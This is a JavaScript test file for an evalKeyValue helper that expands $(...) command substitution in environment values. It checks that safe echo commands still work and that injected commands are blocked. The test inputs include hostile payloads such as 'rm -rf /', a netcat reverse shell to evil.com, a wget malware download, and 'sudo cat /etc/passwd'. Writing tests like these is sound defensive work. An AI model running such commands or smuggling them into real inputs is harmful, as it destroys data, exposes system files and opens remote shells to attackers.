const t = require('tap')
const evalKeyValue = require('../../../src/lib/helpers/evalKeyValue')

t.test('evalKeyValue security tests', ct => {
  const processEnv = { HOME: '/home/user' }
  const runningParsed = { VAR: 'value' }

  // Test legitimate commands work
  ct.equal(
    evalKeyValue('TEST', 'Hello $(echo world)', processEnv, runningParsed),
    'Hello world',
    'legitimate echo command works'
  )

  // Test malicious command injection is blocked
  ct.throws(
    () => evalKeyValue('EVIL', 'value $(rm -rf /) more', processEnv, runningParsed),
    /Command 'rm' is blocked for security reasons/,
    'blocks rm command injection'
  )

  ct.throws(
    () => evalKeyValue('EVIL', 'value $(echo hello; curl evil.com)', processEnv, runningParsed),
    /Command contains potentially dangerous patterns/,
    'blocks command chaining injection'
  )

  ct.throws(
    () => evalKeyValue('EVIL', 'value $(sudo cat /etc/passwd)', processEnv, runningParsed),
    /Command 'sudo' is blocked for security reasons/,
    'blocks sudo privilege escalation'
  )

  ct.throws(
    () => evalKeyValue('EVIL', 'value $(nc -e /bin/sh evil.com 4444)', processEnv, runningParsed),
    /Command 'nc' is blocked for security reasons/,
    'blocks reverse shell attempt'
  )

  ct.throws(
    () => evalKeyValue('EVIL', 'value $(wget http://evil.com/malware)', processEnv, runningParsed),
    /Command 'wget' is blocked for security reasons/,
    'blocks remote file download'
  )

  ct.throws(
    () => evalKeyValue('EVIL', 'value $(bash -c "echo pwned")', processEnv, runningParsed),
    /Command 'bash' is blocked for security reasons/,
    'blocks shell invocation'
  )

  // Test that multiple command substitutions are all sanitized
  ct.throws(
    () => evalKeyValue('EVIL', 'Start $(echo safe) middle $(rm -rf /) end', processEnv, runningParsed),
    /Command 'rm' is blocked for security reasons/,
    'blocks dangerous commands even with safe ones present'
  )

  ct.end()
})

t.test('evalKeyValue preserves existing functionality', ct => {
  const processEnv = { HOME: '/home/user', MACHINE: 'test' }
  const runningParsed = { VAR: 'value' }

  // Test cases that should continue to work from existing tests
  ct.equal(
    evalKeyValue('ECHO', '$(echo echo)', processEnv, runningParsed),
    'echo',
    'simple echo works'
  )

  ct.equal(
    evalKeyValue('COMPLEX', '$(echo "test with quotes")', processEnv, runningParsed),
    'test with quotes',
    'echo with quotes works'
  )

  // Test that failed commands still get proper error handling
  ct.throws(
    () => evalKeyValue('FAIL', '$(thisisnotacommand)', processEnv, runningParsed),
    /COMMAND_SUBSTITUTION_FAILED/,
    'non-existent commands still produce proper error'
  )

  ct.end()
})
